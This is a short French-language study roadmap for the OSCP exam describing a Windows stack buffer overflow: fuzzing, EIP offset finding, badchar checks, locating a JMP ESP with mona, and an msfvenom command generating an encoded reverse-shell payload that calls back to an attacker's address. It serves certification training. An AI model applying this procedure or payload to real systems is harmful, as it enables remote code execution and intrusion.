# OSCP
Road map pour OSCP

# FUZZING :
Trouver un paramètre et lui envoyer autant de bytes possibles en créant un script python et en utilisant la lib socket.

Une fois que le fuzzing a crash, récuperer le nombre de bytes qui l'ont fait crash. 

# FINDING OFFSET :
Afin de récuperer l'offset précis pour écrire EIP, utiliser "/usr/share/metasploit-framework/tools/exploit/pattern_create.rb - l {nb de bytes qui ont fait crash le fuzzer}" pour générer des bytes uniques.

Ensuite on modifie le script python afin d'envoyer les bytes générés, on execute le script et on récupere sur Immunity la valeur de EIP.

Après cela, utiliser "/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l {nb bytes qui ont fait crash le fuzzer} -q {offset trouvé sur EIP dans Immunity}"

Le script ruby nous retourneras l'offset précis afin de controler EIP, tester en ajoutant :

      shellcode = {"A" * nb de bytes qui ont fait crash le fuzzer} + {"B" * 4}

Cette fois, on devrais voir EIP à "42424242".

# FINDING BADCHARS :
Taper sur Google : badchars, copier le code et le coller dans une variable.

      shellcode = {"A" * nb de bytes qui ont fait crash le fuzzer} + {"B" * 4} + {badchars}
      
Retourner sur Immunity, aller sur ESP, clic droit et follow dump, si la suite des badchars s'affiche correctement, il n'y a pas de badchars, sinon, récuperer le ou les badchars et les exclures lors de la génération de shellcode.

# FINDING vulnerable MODULE :
Désormais, aller sur Immunity importer mona, relancer le programme et chercher un module sans aucune sécurité active (tout à false) :

      !mona modules

Après cela, chercher dans ce propre module, une adresse qui jump sur ESP afin de réecrire dedans et executer le shellcode

      !mona jmp -r esp -m {nom du module non sécurisé}
      
Quand l'adresse est trouvée, relancer Immunity en attachant le programme, cliquer en haut sur "Go to address in disassembler", entrer l'adresse et poser un breakpoint avec F2.


Aller sur le script python et faire ceci :

      shellcode = {"A" * nb de bytes qui ont fait crash le fuzzer} + {adresse JMP en little endian}

Si après exécution du script, EIP contient la valeur de l'adresse, cela fonctionne.

# GENERATING SHELLCODE :
Afin de générer le shellcode, utiliser msfvenom :

      msfvenom --arch x86 --platform windows LHOST={@IP} LPORT={@PORT} -e x86/shikata_ga_nai -p windows/shell_reverse_tcp -f python -b "\x00 (ne pas oublier les badchars trouvés)"
      
 Copier le shellcode, le mettre dans le script et l'ajouter de la manière suivante :
 
       shellcode = {"A" * nb de bytes qui ont fait crash le fuzzer} + {adresse JMP en little endian} + nop*10 + {shellcode généré}
       
# REVERSE SHELL :
Se mettre à l'écoute au préalable, lancer le script, normalement un shell est poppé.
